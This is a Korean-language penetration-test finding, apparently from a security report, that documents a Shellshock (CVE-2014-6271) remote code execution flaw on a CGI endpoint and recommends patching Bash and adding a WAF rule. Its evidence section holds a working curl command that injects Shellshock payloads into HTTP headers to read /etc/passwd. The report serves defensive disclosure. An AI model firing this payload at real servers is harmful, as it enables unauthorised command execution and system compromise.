## ShellShock - Remote Code Execution
- **End-Point**: `http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/test`
- **영향**: 원격 코드 실행(RCE)을 통해 공격자가 대상 시스템에 비인가 접근하거나 데이터를 탈취하고 시스템 전체를 장악할 수 있는 치명적인 위험이 있습니다.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수 정의 뒤에 오는 추가 문자열을 처리하는 과정의 결함(CVE-2014-6271)을 이용한 취약점입니다. Apache HTTP Server의 mod_cgi/mod_cgid 모듈과 같이 외부 입력을 환경 변수로 설정하는 환경에서 조작된 페이로드를 통해 임의 명령을 실행할 수 있습니다.
- **근거**: 다음과 같이 HTTP 헤더(`Cookie`, `Referer`, `Shellshock`)에 함수 정의 형식을 이용한 명령 실행 페이로드를 주입하여 `/etc/passwd` 파일의 내용을 조회하는 방식으로 취약점을 확인하였습니다.
```bash
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' 'http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/test'
```
- **대응**: 취약점이 해결된 최신 버전의 GNU Bash로 업데이트를 수행해야 합니다.
- **조치**: 운영체제 패키지 관리자(yum, apt 등)를 통해 Bash 패치를 적용하고, 웹 방화벽(WAF)에서 `() { :; };` 패턴을 포함한 요청을 차단하도록 설정하며 불필요한 CGI 스크립트 노출을 제한합니다.
